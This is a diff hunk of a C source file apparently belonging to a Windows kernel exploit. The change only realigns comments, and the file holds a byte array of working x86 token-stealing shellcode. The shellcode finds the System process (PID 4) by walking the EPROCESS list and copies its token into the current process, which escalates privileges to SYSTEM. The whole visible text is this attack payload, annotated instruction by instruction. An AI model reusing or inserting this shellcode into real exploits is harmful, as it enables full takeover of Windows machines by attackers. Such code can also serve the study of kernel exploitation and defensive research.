@@ -10,18 +10,18 @@ int wmain(int argc, wchar_t* argv[])
 	BOOL bResult = FALSE;
 
 	CHAR ShellCode[] = "\x60"		// pushad										; Save register state on the Stack
-		"\x64\xA1\x24\x01\x00\x00"	// mov eax, fs:[KTHREAD_OFFSET]				; nt!_KPCR.PcrbData.CurrentThread
-		"\x8B\x40\x50"			// mov eax, [eax + EPROCESS_OFFSET]			; nt!_KTHREAD.ApcState.Process
+		"\x64\xA1\x24\x01\x00\x00"	// mov eax, fs:[KTHREAD_OFFSET]			; nt!_KPCR.PcrbData.CurrentThread
+		"\x8B\x40\x50"			// mov eax, [eax + EPROCESS_OFFSET]		; nt!_KTHREAD.ApcState.Process
 		"\x89\xC1"			// mov ecx, eax (Current _EPROCESS structure)	
-		"\x8B\x98\xF8\x00\x00\x00"	// mov ebx, [eax + TOKEN_OFFSET]			; nt!_EPROCESS.Token
+		"\x8B\x98\xF8\x00\x00\x00"	// mov ebx, [eax + TOKEN_OFFSET]		; nt!_EPROCESS.Token
 		//---[Copy System PID token]
-		"\xBA\x04\x00\x00\x00"		// mov edx, 4 (SYSTEM PID)				; PID 4 -> System
-		"\x8B\x80\xB8\x00\x00\x00"	// mov eax, [eax + FLINK_OFFSET] <-|			; nt!_EPROCESS.ActiveProcessLinks.Flink
+		"\xBA\x04\x00\x00\x00"		// mov edx, 4 (SYSTEM PID)			; PID 4 -> System
+		"\x8B\x80\xB8\x00\x00\x00"	// mov eax, [eax + FLINK_OFFSET] <-|		; nt!_EPROCESS.ActiveProcessLinks.Flink
 		"\x2D\xB8\x00\x00\x00"		// sub eax, FLINK_OFFSET           |
-		"\x39\x90\xB4\x00\x00\x00"	// cmp [eax + PID_OFFSET], edx     |			; nt!_EPROCESS.UniqueProcessId
-		"\x75\xED"					// jnz           ->|			; Loop !(PID=4)
-		"\x8B\x90\xF8\x00\x00\x00"	// mov edx, [eax + TOKEN_OFFSET]			; System nt!_EPROCESS.Token
-		"\x89\x91\xF8\x00\x00\x00"	// mov [ecx + TOKEN_OFFSET], edx			; Replace Current Process token
+		"\x39\x90\xB4\x00\x00\x00"	// cmp [eax + PID_OFFSET], edx     |		; nt!_EPROCESS.UniqueProcessId
+		"\x75\xED"			// jnz				 ->|		; Loop !(PID=4)
+		"\x8B\x90\xF8\x00\x00\x00"	// mov edx, [eax + TOKEN_OFFSET]		; System nt!_EPROCESS.Token
+		"\x89\x91\xF8\x00\x00\x00"	// mov [ecx + TOKEN_OFFSET], edx		; Replace Current Process token
 		//---[Recover]
 		"\x61"				// popad										; Restore register state from the Stack
 		"\x31\xC0"			// NTSTATUS -> STATUS_SUCCESS :p
